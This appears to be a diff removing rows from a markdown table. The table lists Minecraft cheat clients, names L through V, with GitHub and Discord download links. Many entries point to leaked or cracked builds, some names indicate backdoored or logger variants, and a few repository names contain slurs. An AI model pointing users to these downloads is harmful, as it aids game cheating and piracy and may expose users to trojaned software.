-| Lepton | https://github.com/MatrixAura/Lepton-Client |
-| LeuxBackdoor        | https://github.com/accessmodifier364/LeuxBackdoor       |
-| LifeLine            | https://github.com/ImCzf233/Lifeline-opensource // https://github.com/ImCzf233/lifeline-2.0-opensource         |
-| Lime                | https://cdn.discordapp.com/attachments/1045307569482244157/1067140707342635008/Lime.zip |
-| LiquidBounce        | https://github.com/CCBlueX/LiquidBounce                 |
-| LiquidBounce+ / LiquidBouncePlus | https://github.com/WYSI-Foundation/LiquidBouncePlus     |
-| LiquidBounce+ Reborn / LiquidBouncePlus Reborn | https://github.com/liquidbounceplusreborn/LiquidbouncePlus-Reborn |
-| LiquidBounce++ / LiquidBouncePlusPlus | https://github.com/TheMosKau/LiquidBouncePlusPlus       |
-| LiquidCat           | https://github.com/CatsDevelopment/LiquidCat            |
-| Liquido             | https://github.com/SuperCraftAlex/liquido               |
-| LiquidShadow        | https://github.com/woodteam/LiquidShadow                |
-| LiquidX             | https://github.com/PrahXZ/LiquidX                       |
-| Lirium | https://github.com/000000000-1/Lirium |
-| ListedHack          | https://github.com/chris2rich/ListedHack                |
-| Litka | https://github.com/WalmartSolutions/Litka |
-| LiveSense           | https://github.com/WMSGaming/LiveSense                  |
-| LmaoBox | https://github.com/Vimer5410/LmaoBox-leak |
-| LoseBypass          | https://losebypass.com // https://github.com/deadLORD135/losebypass-reup          |
-| LoustHack | https://github.com/tRollaURa/LoustHackCracked |
-| Love                | https://github.com/chris2rich/LoveClient                |
-| Lover               | https://github.com/DoNhutTann/Lover-public // https://github.com/KgDW/Lover-decomp-buildable |
-| Luchadora           | https://github.com/x4e/Luchadora                        |
-| LuckyClient         | https://github.com/ImCzf233/LuckyClient-opensource      |
-| LuigiHack / Alice   | https://github.com/3000IQPlay/LuigiHacks-deobf          |
-| LumaHack            | https://github.com/cocoapc911/LumaHack-0.0.7-Leaked-by-cocoapc911 |
-| LumeMinus / Luma-   | https://github.com/3000IQPlay/LumaMinus-leaked          |
-| Lumen               | https://github.com/olliem5/lumen                        |
-| Lumina Client | https://github.com/LuminaDevelopment/LuminaClient |
-| Luna | https://github.com/NoseFlicker/Luna-master |
-| LuneClient          | https://github.com/SuperSkidder/LuneClient              |
-| Lycoris | https://github.com/VVriter/Lycoris-client-leak |
-| Lycoris             | https://github.com/GSCSDSUN/Flower-Team-OpenSource // https://github.com/LostAttractor/Lycoris-Client // https://github.com/LostAttractor/Lycoris-Loader|
-| Lynx                | https://github.com/Based-devs/Lynx                      |
-| M3dC3t / MadCat     | https://github.com/redvx/M3dC3t // https://github.com/KgDW/MadCat-deobf-decomp-buildable // https://github.com/3000IQPlay/M3dC3t-leaked // https://github.com/iM4dCat/M3dC3tV2 |
-| MacHack             | https://github.com/ChiquitaV2/MacHack                   |
-| MachineLite | https://github.com/YOSSHIXD/MachineLite |
-| MackMod             | https://github.com/HausemasterIssue/MackMod             |
-| MahanWare           | https://github.com/OldReposRIP/Mahan-Ware-b9-Leak       |
-| Manjaro | https://github.com/tuskypaster/Manjaro-Client |
-| MarlowClient | https://github.com/MarlowDevelopment/MarlowClient |
-| MasterMind | https://github.com/Snowiiii/MasterMind |
-| MatHax              | https://github.com/Volcan4436/Mathax-2.0-Unreleased-Dev-Source // https://github.com/LordDoom-eng/MatHax-Client-Legacy // https://github.com/antonchu2006/MatHaxClient // https://github.com/CoolLucy12321/Installer |
-| MawouteClient       | https://github.com/VenuzWeeb/mawoutehack                |
-| MayhemClient        | https://github.com/martin010919/Mayhem_client           |
-| MaywrWare           | https://github.com/maywr/maywrware                      |
-| McDonald            | https://github.com/MOMIN5/McDonald-1.1.7-Cracked-and-SRC |
-| MClient++ / MClientPlusPlus | https://github.com/MClientMCPE/MClientPlusPlus          |
-| MCPClient | https://github.com/wrrulosdev/mcpclient |
-| MedusaWare          | https://github.com/4wl/MedusaWare                       |
-| Melon | https://github.com/dyyibang/MelonRewrite-OpenSourceCode // https://github.com/KgDW/Melon-Fabric-leaks // https://github.com/KgDW/Melon-leaks |
-| MelodySky | https://github.com/sora-kawaii/MelodySky |
-| MelonHack+ / MelonHackPlus | https://github.com/chris2rich/melonhack-plus            |
-| MemeWare            | https://github.com/whosthatperson/MemeWare...-one-last-time |
-| MeowHack            | https://github.com/NotKronos/meowhack                   |
-| Mercury             | https://github.com/DarkiBoi/Mercury-Client // https://github.com/minecraft-clients/Mercury-Client-BUILDABLE_SRC |
-| Mercury Pro | https://github.com/2young2care/MercuryClientPro0.3 |
-| Meteor              | https://github.com/MeteorDevelopment/meteor-client // https://meteorclient.com |
-| Meteor+ / MeteorPlus | https://github.com/Nekiplay/MeteorPlus                  |
-| MethodClient        | https://github.com/danmaster2/MethodClient              |
-| MetteroV2           | https://github.com/1bytes-sb/MeteorV2                   |
-| Miku                | https://github.com/VenuzWeeb/Miku-BUILDEABLE-SRC        |
-| Minced              | https://github.com/tuskypaster/Minced-Free-Builds // https://github.com/noom1337/hacked-client-collection/tree/main/Minced%201.8%20(1.12.2) |
-| Minced 1.20.4 | https://github.com/tuskev1ch/minced-1.20.4 |
-| Mint                | https://github.com/RealzPrestige/Mint-Public            |
-| MinusBounce | https://github.com/MinusMC/MinusBounce |
-| Mio | https://github.com/TwoNick/mio // https://mioclient.me/ | 
-| Mio (Free) | https://github.com/asphyxia1337/mioclient-me |
-| Mirai               | https://github.com/kylerittenhause/mirai-client-decompiled |
-| Misericordia | https://github.com/Halqq/misericordia-client |
-| Moloch.su           | https://github.com/Canonball90/moloch.su // https://github.com/Woodz2706/moloch.su-FAT-leak- // https://github.com/VVriter/Moloch.su |
-| Momentum            | https://github.com/momentumdevelopment/momentum         |
-| MoneyMod+2 / MoneyModPlusTwo | https://github.com/PlutoSolutions/moneymodplus2-src     |
-| MoneyMod+3 / MoneyModPlusThree | https://github.com/mr-nv/moneymodplus3 // https://github.com/doctor-swag/moneymod-rewrite |
-| MonkeClient | https://github.com/TheDarkLach/monke-client |
-| MonkeyClient        | https://github.com/TheDarkLach/monke-client             |
-| MonSoon             | https://intent.store // https://monsoon.wtf             |
-| Moon                | https://github.com/master7720/moon-leak                 |
-| MoonGod | https://github.com/redvx/MoonGod |
-| Moonlight | https://github.com/dada994a/moonlight-1.5.0 |
-| Moonlight           | https://github.com/Gav06/Moonlight                      |
-| Moonlight           | https://crystalpvp.ru/moonlight/ // https://github.com/PlutoSolutions/Moonlight |
-| Moonlight (Meadows) | https://github.com/kawaiizenbo/MoonlightMeadows |
-| Moonlight  1.8.9 | https://github.com/randomguy3725/MoonLight |
-| MoonWare            | https://github.com/tuskypaster/MoonWare-Client // https://github.com/noom1337/hacked-client-collection/tree/main/MoonWare%20(1.12.2) |
-| Morgen.cc           | https://github.com/3000IQPlay/morgen.cc                 |
-| MotClient           | https://github.com/WarriorCrystal/MotClient-Buildeable-SRC |
-| Mousse              | https://github.com/Snoworange420/Mousse                 |
-| Muffin              | https://github.com/The-Gopro336-Archive/Muffin-SRC-BUILDABLE |
-| Mushroom | https://github.com/WalmartSolutions/Mushroom-SRC |
-| Myau | https://github.com/60124808866/OpenMyau |
-| MythClient          | https://github.com/LocalChineseMan/MythClient           |
-| Nadia | https://github.com/NotHarper/Nadia |
-| Namida              | https://github.com/Jebacka/Namida/tree/untagged-f294145a5d25e0a23317 |
-| NanoSense           | https://github.com/Mic2333/NanoSense                    |
-| NClient             | https://github.com/sn115426/rip-nclient // https://github.com/sn115426/nclient |
-| Nebula              | https://github.com/Sxmurai/nebula                       |
-| Neko+ / NekoPlus    | https://github.com/ProfKambing/nekoplus-public          |
-| Neptune | https://github.com/Volcan4436/Neptune-Client // https://github.com/RickyTheRacc/neptuneforeveryone // https://github.com/SoftWaren1/Neptune-New |
-| Neptunium           | https://github.com/Neptunium-Development/neptunium-client |
-| Neutron             | https://github.com/GentlemanMC/Neutron-1.6.0-leak       |
-| NeverBuy | https://github.com/WalmartSolutions/NeverBuy-1.2 |
-| Neverdies | https://github.com/dada994a/Neverdies-old // https://github.com/2young2care/Neverdies.me // https://github.com/primewk/neverdies-leak |
-| NeverHook           | https://github.com/ffa0xqz/NeverHook-Reborn-v0.8-src // https://github.com/decausedinside/NeverHook-Premium-SRC |
-| NextifyQristo | https://github.com/2young2care/NextifyQristo-2.0.0-crack |
-| Nexus | https://github.com/StephenIsTaken/NexusOpen // https://github.com/AllahSolutions/cracked-nexus-client // https://github.com/WalmartSolutions/Nexus-1.0 |
-| Nexus Edge | https://github.com/Smug2f/Nexus-Edge |
-| Nhack               | https://github.com/whosthatperson/Nhack                 |
-| NHack3              | https://github.com/whosthatperson/Nhack3-V0.9.1-itristan-log-removed |
-| Nhack4              | https://github.com/funtimeonly990/nhack4                |
-| NiggaHack           | https://github.com/zopac/niggahack                      |
-| NightClient         | https://cdn.discordapp.com/attachments/688386845062725662/688389070908424287/NightClient.jar |
-| NightWare+ / NightWarePlus | https://github.com/quangtien1/Nightware-Plus-Hacked-Client |
-| NightX              | https://github.com/Aspw-w/NightX-Client                 |
-| NineHack            | https://github.com/ninethousand9000/ninehackv1          |
-| Noat Wurst+2 / Noat WurstPlusTwo | https://github.com/kool-kuhm-klients/noat-wurstplus-two |
-| NobleSix            | https://github.com/helloworldSB/NobleSixHL32K // https://cdn.discordapp.com/attachments/611452108826214401/686087486681776161/NobleSixb2.9-release.jar |
-| NoobHack            | https://github.com/NoobHackLol/NoobHack                 |
-| Norsa               | https://github.com/Valkriea/Norsa                       |
-| Norules             | https://github.com/jabask3dd3r/Norules-src              |
-| NotEnoughtCoins Premium / NEC Premium | https://github.com/3000IQPlay/NEC-Premium |
-| Notorious           | https://github.com/CumHax/NOTORIOUS-BUILDABLE-SRC // https://github.com/oyzipfile/Notorious-5.5-Buildable // https://github.com/Notme11/Notorious2.0 |
-| November | https://github.com/WalmartSolutions/November-3.03 |
-| Novoline            | https://github.com/jeremypelletier/novoline-unlicensed // https://novoline.wtf |
-| NullHack | https://github.com/xiguajerry/NullHack |
-| NullPoint | https://github.com/hashdiana/NullPoint-Client // https://github.com/dyyibang/NullPoint-Client // https://github.com/KgDW/NullPoint-Fabric // https://github.com/2young2care/Nullpoint-v2.1.3 |
-| Nursultan           | http://nursultan.fun                                    |
-| North | https://github.com/WalmartSolutions/North |
-| NutGod.CC           | https://github.com/HausemasterIssue/Nutgod.cc-b1.5-SRC // https://cdn.discordapp.com/attachments/689054797818888226/703185565016653884/NutGod_b5.3-propercrackbycrystallinqq.jar |
-| NyaHack             | https://github.com/chunfeng666/nyahack                  |
-| OakClient           | https://github.com/desertcod98/OakClient                |
-| Oasis | https://github.com/0xTas/oasis |
-| ObamaHack           | https://github.com/chris2rich/ObamaHack                 |
-| Oblivion            | https://cdn.discordapp.com/attachments/622299315028885514/701308296673362030/Oblivion-v0.3-release.jar |
-| OctoHack            | https://github.com/Primooctopus33/octohack              |
-| Omega               | https://github.com/ya-ilya/omega                        |
-| OmegaHack           | https://github.com/neilhuang007/omegahack               |
-| OmegaHack Rewrite | https://github.com/neilhuang007/omegahack-rewrite |
-| OnePop              | https://github.com/MrsRina/onepop                       |
-| Onigiri             | https://github.com/Nodoka4318/OnigiriClient             |
-| Onyx | https://github.com/PlayingCow69420/Onyx-Client-Archive |
-| Opal | https://github.com/WalmartSolutions/Opal-1.6 |
-| Opium | https://github.com/dada994a/Opium-buildableScd |
-| Orangette           | https://github.com/cocoapc911/Orangatte-Client-Leak // https://github.com/OrangetteTeam/Orangette |
-| ORH | https://github.com/VVriter/ORH |
-| Oringo              | https://github.com/Negro-Development/OringoClient-Cracked |
-| Orion               | https://github.com/AntiCope/orion                       |
-| Osiris              | https://github.com/DarkiBoi/Osiris                      |
-| Osiris+ / OsirisPlus | https://github.com/THCFree/client                       |
-| Outrage             | https://github.com/yallxe/outrage                       |
-| Ovaq Reborn | https://github.com/dada994a/OvaqReborn |
-| Ovaq RebornPlus / Ovaq Reborn+ | https://github.com/hypinohaizin/OvaqRebornPlus |
-| Override            | https://github.com/Syamu0120/Override                   |
-| OwnedWare           | https://github.com/Own3dM3/OwnedWare-leacked            |
-| OyVey               | https://github.com/The-Gopro336-Archive/OyVey_Rewrite-BUILDABLE_SRC // https://github.com/ssllllll/OyVey-Continued-FaxHack-Owned // https://github.com/Zane2b2t/oyvey-0.0.3 |
-| OyVey+ / OyVeyPlus  | https://github.com/BigJayMuffinSkidsShit/OyVeyPlus      |
-| OyVey Rewrite | https://github.com/jiyun233/OyveyRewrite |
-| Ozark               | https://github.com/Trambled/OzarkClient                 |
-| PandoraHack         | https://github.com/jam-in-a-jar/PandoraHack-for-everyone |
-| Paragon             | https://github.com/Wolfsurge/Paragon                    |
-| Past                | https://github.com/olliem5/past                         |
-| PastiqueV2 | https://github.com/RubberDucky5/PastiqueV2 |
-| Penguin             | https://github.com/funtimeonly990/Penguin-Client        |
-| PepsiMod            | https://github.com/Team-Pepsi/pepsimod                  |
-| PerryPhobos         | https://github.com/Eralp232/PerryPhobos-Latest          |
-| PGz                 | https://github.com/3000IQPlay/PGzClient                 |
-| Phantom | https://github.com/Lwescool/phantom |
-| Phasma | https://github.com/Librry1337/phasma-1.16.5-client |
-| Phobos              | https://github.com/The-Gopro336-Archive/CLEAN_Phobos_1.9.0-BUILDABLE-SRC |
-| Phobos Lite         | https://github.com/WarriorCrystal/PhobosLite            |
-| PhoboxNotGay        | https://github.com/PeterPePem/PhoboxNotGay              |
-| PigHack             | https://github.com/chris2rich/PigHack-Buildable-SRC // https://github.com/w0rl3x/PigHack |
-| PikaHack            | https://cdn.discordapp.com/attachments/738991724793299004/738998489194823736/PikaHack-Owner-master-b9-release.jar |
-| PistonClient        | https://github.com/AlexProgrammerDE/PistonClient        |
-| Pizza               | https://github.com/AstrqlDev/Pizza-Client               |
-| PocketClient | https://github.com/JMcrafter26/pocket-client |
-| PollosHook | https://github.com/smokedope2k16/polloshook-buildable |
-| PornoClient         | https://github.com/ezhhh/pornoclient                    |
-| Postamn++ / PostmanPlusPlus | https://github.com/srgantmoomoo/postmanplusplus         |
-| Postman             | https://github.com/srgantmoomoo/postman                 |
-| Prestige | https://github.com/lattiahirvio/prestige-src // https://gitlab.com/3000IQPlay/Prestige // https://prestigeclient.vip // https://crystalpvp.ru/prestige |
-| Pride+ / PridePlus | https://github.com/MolokyMC/PridePlus |
-| Proactive           | https://github.com/ChompChompDead/Proactive             |
-| Progreso | https://github.com/ya-ilya/progreso |
-| ProtoHax            | https://github.com/hax0r31337/ProtoHax                  |
-| Proton              | https://cdn.discordapp.com/attachments/689371591976681522/726629851519254608/proton-1.2-build20200604.jar |
-| PubDLC | https://github.com/lgsquen/PubDLC |
-| Pulse | https://github.com/WalmartSolutions/Pulse-1.0.3 |
-| Pulsive             | https://intent.store                                    |
-| PureHack            | https://github.com/Mathrandom7910/PureHack              |
-| Pyro                | https://www.pyroclient.com // https://crystalpvp.ru/pyro/ // https://github.com/PlutoSolutions/Pyro |
-| Quantum             | https://github.com/PlutoSolutions/6god-Quantum          |
-| Quantum Continued   | https://github.com/fan4145/quantum-continued-releases // https://github.com/fan4145/quantum-src-releases |
-| Qubit | https://github.com/QuantumClient/Qubit |
-| Qusar               | https://github.com/goose-TM/Qusar-Client                |
-| QweruHax | https://github.com/gkursi/QweruHax |
-| Radeon              | https://github.com/zopac/Radeon-v1.2-Open-source-edition // https://github.com/IllegalException/Radeon |
-| Rage                | https://github.com/noom1337/rage-client-deobfuscated    |
-| RailHack            | https://github.com/kisman2000/RailHack-Ratted // https://github.com/3000IQPlay/RailHack-0.5.9-Src |
-| Rainbow             | https://github.com/noom1337/rainbow_client-src-leak     |
-| Raion               | https://github.com/Ropro2002/raion-public // https://github.com/Phantom568/Raion // https://cdn.discordapp.com/attachments/689371591976681522/726059676051177513/Raion_Loader.jar |
-| RatWare | https://github.com/Tr0llMode/RatWare-leak-0.4.0 |
-| RavenB- / RavenBMinus | https://github.com/WalmartSolutions/RavenB-v9 // https://github.com/WalmartSolutions/RavenB-Latest // https://github.com/WalmartSolutions/RavenB-Old2 // https://github.com/WalmartSolutions/RavenB-Old |
-| Raven B+ / RavenBPlus | https://github.com/Kopamed/Raven-bPLUS                  |
-| Raven B++ / RavenBPlusPlus | https://github.com/ImCzf233/Raven-B-PlusPlus-opensource                  |
-| Raven B+++ / RavenBPlusPlusPlus | https://github.com/StephenIsTaken/Raven-BPlusPlusPlus |
-| Raven BS | https://github.com/Strangerrrs/Raven-bS |
-| Raven BS Alpha | https://github.com/q1/raven-bs-alpha |
-| Raven N+ / RavenNPlus | https://github.com/SleepyFishYT/RavenNPlus              |
-| Raven O++ / RavenOPlusPlus | https://github.com/ItzzOwo/RavenOPlusPlus |
-| Raven XD | https://github.com/xia-mc/Raven-XD |
-| RavenWeave          | https://github.com/PianoPenguin471/RavenWeave           |
-| Razmorozka          | https://github.com/amfero/razmorozka                    |
-| Reach Premium       | https://github.com/VVriter/Reach-Premium-src            |
-| Reaper              | https://github.com/AntiCope/reaper-addon                |
-| Rebirth             | https://github.com/FinLemonKe/RebirthClient // https://github.com/chunfeng666/rebirth-public // https://github.com/iM4dCat/Rebirth // https://github.com/KgDW/Rebirth-deobf-decomp-buildable |
-| Rebirth 1.20.1 | https://github.com/abk19x/Rebirth-1.5-private |
-| Rebirth Alpha | https://github.com/hashdiana/Rebirth-Alpha |
-| Rebirth Nextgen | https://github.com/dyyibang/Rebirth-Nextgen-Public |
-| reDACTED | https://github.com/paramkudle/reDACTED |
-| ReflectionClient    | https://github.com/xss1de/ReflectionClient              |
-| Remnant | https://github.com/miamionthetrack/remnant |
-| RenoSense           | https://github.com/Sjnez613/RenoSense-Rewrite           |
-| RenoSenseTwo        | https://github.com/RaddonEnterprises/renosense-cracked  |
-| RerHack.club        | https://github.com/Canonball90/RerHack.club             |
-| Resilience          | https://github.com/MinecraftModdedClients/Resilience-Client-Source |
-| Revenge             | https://github.com/PlutoSolutions/revenge-1.5.6-Leak    |
-| Reverse             | https://github.com/PlutoSolutions/ReverseClient         |
-| Reznya              | https://github.com/ZimnyCat/reznya                      |
-| Rift                | https://github.com/3000IQPlay/Rift-Client-1.0.3-Src     |
-| Rich                | https://github.com/decausedinside/Rich-Client-Free-Source-Code |
-| Rise                | https://github.com/dada994a/Rise-Latest-Source-leak // https://riseclient.com // https://anonfiles.com/6a7bnaZ1ye/Rise_6_0_master_zip // https://github.com/tuskypaster/Rise-Client-Source |
-| Rocan               | https://github.com/MrsRina/Official-Rocan // https://github.com/4wl/rocan-main |
-| RockEZHack          | https://github.com/oyzipfile/rockEZHack                 |
-| RockStar            | https://github.com/ConeTin/rockstar-free                |
-| RoseGold            | https://github.com/RoseGoldIsntGay/RoseGoldClient       |
-| Ruby                | https://github.com/RealzPrestige/Ruby                   |
-| Ruhama              | https://github.com/chris2rich/Ruhama                    |
-| Ruhama+             | https://github.com/rolkoztm/ruhama-plus-with-jar        |
-| RusherHack          | https://rusherhack.org // https://crystalpvp.ru/rusherhack/ |
-| RussianWare         | https://github.com/d2hv/RussianWare                     |
-| Rustme              | https://github.com/oyzipfile/Rustme-Clients-Source-Code |
-| SafePoint.club / SafePointClub | https://github.com/Canonball90/SafePointy               |
-| SafePoint+2 / SafePointPlusTwo | https://github.com/Canonball90/Safepoint2               |
-| Salhack             | https://github.com/ionar2/spidermod                     |
-| SalHackSkid         | https://github.com/pleasegivesource/SalHackSkid         |
-| Salt                | https://github.com/gerald0mc/Salt                       |
-| Satellite           | https://github.com/SatelliteClient/Satellite            |
-| Saturn              | https://github.com/Sxmurai/saturn-client                |
-| Saturn / EsoHack Rewrite | https://github.com/cryst-al/oyvey-skids/releases/tag/saturn // https://github.com/Intel-i80486-DX4/esohack-rewrite-upload |
-| Schizoid | https://github.com/Lyzev/Schizoid |
-| Scrim | https://github.com/Tehnicki1/Scrim-Client |
-| Selene              | https://github.com/Canonball90/SeleneLeak               |
-| Seppuku             | https://github.com/seppukudevelopment/seppuku           |
-| Serenity            | https://github.com/KohimaNayagato/Serenity              |
-| SerenityCE          | https://github.com/SerenityEnterprises/SerenityCE       |
-| SeturHack           | https://github.com/3000IQPlay/SaturHack                 |
-| SevCheat            | https://github.com/SevJSix/SevCheat                     |
-| SexHack             | https://github.com/noatmc/sexhack                       |
-| SexMaster.cc        | https://github.com/AnotherNoName/SexMaster.CC           |
-| Shadow              | https://github.com/LunaWasFlaggedAgain/Shadow           |
-| ShafferHack         | https://github.com/IntelliBlade/ShafferHack-Lightweight-PvP-Client |
-| ShellSock           | https://github.com/ImCzf233/OpenLogger                  |
-| SHGR                | https://github.com/KamiSkidder/shgr-client              |
-| Shid | https://github.com/stever9487/shid-client |
-| Shimeji | https://github.com/enokitoraisu/ShimejiClient-Public |
-| Shoreline | https://github.com/KuroHere/shoreline // https://github.com/pisun6666/shoreline-main |
-| Shoreline NEW | https://github.com/Skitttyy/shoreline-client // https://github.com/TwoNick/shoreline |
-| Shrimp              | https://github.com/Aids-dev/shrimp                      |
-| ShrimpHack | https://github.com/King-Sonder-dev/ShrimpHack |
-| SigamWare.CC        | https://github.com/DrillFyph/SigmaWare.cc               |
-| Sigma               | https://www.sigmajello.ga/downloads                     |
-| Sikiskenkurt.CC | https://github.com/MustafaTheRage/sikiskenkurt.cc-client |
-| Silence             | https://github.com/chris2rich/SilenceClient             |
-| Sirius              | https://github.com/MrBubblegum/Sirius-Mod               |
-| Skid+ / SkidPlus    | https://github.com/cocoapc911/Skid-Plus-Client          |
-| SkidBounce | https://github.com/ManInMyVan/SkidBounce |
-| Skidcraft           | https://github.com/b0LBwZ7r5HOeh6CBMuQIhVu3-s-random-fork/Skidcraft |
-| Skidd.ed / Skidded  | https://github.com/Nitaki-dev/Skidd.ed-Client           |
-| SkidwareMC          | https://github.com/SkidwareMC/Skidware-Client           |
-| Skill               | https://cdn.discordapp.com/attachments/689467748308222040/724824674160082954/skillclient-1.12.2-b11.5.jar |
-| SkilledClient       | https://github.com/pesshown/Skilled-Client-v3           |
-| Skuxx               | https://github.com/slowcheet4h/Skuxx-1.6                |
-| Slack | https://github.com/DGVPSH/SlackOpen // https://github.com/WalmartSolutions/Slack-b1.0 |
-| Sleek               | https://github.com/intexception/SleekClient // https://github.com/SleekCC/leaked-builds             |
-| Slinky.gg | https://github.com/PlutoSolutions/Slinky // https://crystalpvp.ru/slinky/ |
-| Sloth | https://github.com/WalmartSolutions/Sloth |
-| Slu.gg / SluGG      | https://github.com/notRevhacks/Slu.gg-1.0               |
-| SlugClient          | https://github.com/The-Forecaster/Slug-client           |
-| SmartClient         | https://github.com/sssssssthedev/SmartClient            |
-| Smok | https://github.com/SleepyFish-YT/Smok |
-| SMPHack | https://github.com/tanishisherewithhh/Smp-hack |
-| Sn0w                | https://github.com/Skitttyy/Sn0w // https://github.com/ImLegiitXD/Sn0w // https://github.com/pineapplebby/sn0w-2.0.0              |
-| $now / Snow | https://github.com/primewk/snow |
-| Snow                | https://github.com/PlutoSolutions/Snow                  |
-| SnowFallWare        | https://github.com/Sn0wNight/SnowFallWare               |
-| SodaWare | https://github.com/s0daa/sodaware |
-| SolClient           | https://github.com/Sol-Client/Client                    |
-| Sorus               | https://github.com/4wl/Sorus                            |
-| SovietWare          | https://github.com/CumHax/SovietWare                    |
-| Spark               | https://github.com/Spark-Client-Development/Spark-Client |
-| Spark               | https://github.com/Sxmurai/spark                        |
-| SpectClient         | https://github.com/SaberAspect/SpectClient              |
-| Spicy | https://github.com/Spicy-Client/Spicy |
-| SpiderSense         | https://github.com/HausemasterIssue/spidersense         |
-| SplashClient | https://github.com/master7720/SplashClient |
-| Spoon | https://github.com/SpoonClient/Spoon |
-| Stay                | https://github.com/xiguajerry/Stay // https://github.com/cocoapc911/StayClientCrack // https://github.com/hf2kxn/STAY-Client/releases/tag/ALL |
-| StayPro             | https://github.com/chunfeng666/StayProPublic-WuShuang // https://github.com/hf2kxn/STAY-Client/releases/tag/ALL |
-| Stifle              | https://github.com/BadMoXi/Stifle                       |
-| Styles | https://github.com/2young2care/Styles-Client-Old2023_-FULL-CRACKED |
-| Storm | https://github.com/AllahLeaksHvH/Storm-Client |
-| Sudo                | https://github.com/Canonball90/SudoClientLeak           |
-| Strafehack          | https://github.com/kyv3/Strafehack-leaked               |
-| Sugoma              | https://github.com/eetgeenappels/Sugoma                 |
-| Sukumi | https://github.com/iwantheadpats/sukumi-bedrock-opensrc |
-| Summit              | https://github.com/THCFree/summit-client-full // https://github.com/ionar2/summit |
-| Summit+ / SummitPlus | https://github.com/JohnShiozo/SummitPlus                |
-| SumoClient          | https://github.com/pesshown/Sumo-Ghost-Client-Mod-1.8.9 // https://github.com/ImCzf233/Sumo-decompiled |
-| Sunshine | https://github.com/Chromatic-Vision/Sunshine |
-| Supermacy           | https://github.com/master7720/Supermacy-client-1.8.jar-leaked |
-| Sushi               | https://github.com/hashdiana/Sushi-Client // https://github.com/Toshimichi0915/sushi-client          |
-| Sushi.cc v2         | https://github.com/3000IQPlay/Sushi.cc-v2-Phobos-Edition-NoHWID |
-| Sydney | https://github.com/sydney-client/Sydney-Legacy |
-| Syracuse            | https://github.com/stormcoph/Syracuse-4.0 // https://github.com/Volcan4436/Syracuse-3.0-source-leak |
-| System | https://github.com/DLindustries/System |
-| Sweet / Sweet+ / SweetPlus | https://github.com/3000IQPlay/Sweets-deobf              |
-| Swift               | https://github.com/hashPirate/Swift-Client-1.12.2       |
-| Tarasande | https://github.com/Sumandora/tarasande |
-| Target              | https://github.com/yaskylan/Target_Client               |
-| TaterGod.cc         | https://github.com/RealzPrestige/TaterGod-Leak          |
-| TeddyWare           | https://github.com/ChompChompDead/Teddyware-Client      |
-| Temple | https://github.com/PhilipPanda/Temple-Client |
-| Tenacity            | https://intent.store // https://github.com/HCU-Reborn/Tenacity // https://github.com/tuskypaster/Tenacity-for-1.12.2 |
-| Tensor              | https://github.com/IUDevman/Tensor                      |
-| Tesla               | https://github.com/AnotherNoName/Tesla-SRC              |
-| THSense             | https://github.com/ImCzf233/TGSense-Opensource          |
-| Theresa             | https://github.com/YumeGod/TheresaModules               |
-| Thesame.space       | https://github.com/oyzipfile/thesame-space              |
-| ThunderHack+ / ThunderHackPlus | https://github.com/Pan4ur/ThunderHackPlus |
-| ThunderHack Deluxe | https://github.com/WalmartSolutions/ThunderHack-Deluxe // https://github.com/FeydH/Thunderhack-deluxe |
-| ThunderHack Recode | https://github.com/Pan4ur/ThunderHack-Recode |
-| Toast               | https://github.com/RemainingToast/ToastClient           |
-| Tokyo               | https://github.com/RacoonDog/Tokyo-Client               |
-| Tomato              | https://github.com/SlickJava/tomato                     |
-| Toxic.club          | https://github.com/iBikky/toxic.club                    |
-| TransWare           | https://github.com/VxlerieUwU/transware                 |
-| TrapClient          | https://github.com/trap-client/trap-client              |
-| Trinity             | https://github.com/LeonLeonPotato/Trinity               |
-| Trinity+ / TrinityPlus | https://github.com/ssllllll/TrinityPlus-PWNED // https://github.com/urelNiP/TrinityPlus-b2.8-OBF |
-| TrollGod.cc / RealthClient | https://github.com/DBOwinnings/TrollGodCC-v1.5.4-Source-Code // https://github.com/kucukam/RealthClient-TrollGod // https://github.com/bluteest/trollgod.cc-deobf |
-| Trollhack           | https://github.com/Luna5ama/TrollHack                   |
-| Troxill             | https://github.com/Librry1337/Troxill-1.16.5-src |
-| TurcoHack.cc        | https://github.com/3000IQPlay/TurcoHack.cc              |
-| Turok               | https://github.com/chris2rich/turok                     |
-| TuxHack             | https://github.com/Tux8068/TuxHack                      |
-| Uranium             | https://github.com/maywr/uranium                        |
-| Urmomia             | https://github.com/Urmomia/urmomia-client               |
-| Uop.cc | https://github.com/browsky300/uop.cc |
-| UwUGod | https://github.com/Torono909-archive/UwUGod-Modules-Src // https://github.com/MikuSoCute/UwUGod-AllVersion |
-| UZI | https://github.com/yandhi/uzi-1-12 |
-| UZI Client | https://github.com/Unicode01/UZI-Client |
-| Vanadium | https://github.com/TwoNick/vanadium |
-| Vape V4 / VapeV4 | https://github.com/RandomVapeUser/Vape-4.17 // https://github.com/Spec-JohnXina/Vape-v4.16 // https://github.com/KgDW/Vape-V4 // https://github.com/DuckySoLucky/Vape-V4 // https://github.com/skody01/Vape-V4.10-Crack |
-| Vapid               | https://github.com/starcraft66/vapid                    |
-| Vector              | https://github.com/master7720/vector-0.2.9-leak         |
-| VectorClient | https://github.com/VectorClient/Vector-Releases |
-| Vegaline | https://github.com/jntdevelopment/vegaline // https://github.com/WalmartSolutions/VegaLine-00083E // https://github.com/WalmartSolutions/VegaLine-00082E // https://github.com/WalmartSolutions/VegaLine-00078E // https://github.com/WalmartSolutions/VegaLine-00067E // https://github.com/3000IQPlay/VegaLine-00065D-Hotfix |
-| Velocity            | https://github.com/The-Gopro336-Archive/Velocity-BUILDABLE_SRC |
-| VenHack             | https://github.com/v0ndy/venhack                        |
-| VenomHack           | https://github.com/2young2care/Venomhack-1.20.1-update // https://github.com/Bohema-developers/VenomHack-leak // https://github.com/rwah277/Venomhack420-Meteor-Plugin   |
-| Vertex              | https://github.com/AstralDB/VertexClient                |
-| Vertine             | https://github.com/VertineClient/vertine                |
-| VeteranHack         | https://github.com/HausemasterIssue/VeteranHack-Decomp  |
-| VetHack             | https://cdn.discordapp.com/attachments/710922475231248505/723154139902902292/Vethack-b3.7-Release-Meber.jar |
-| Viagra | https://github.com/Shwepss/ViagraClient-1.12.2-hack |
-| Violet              | https://github.com/noatmc/violet                        |
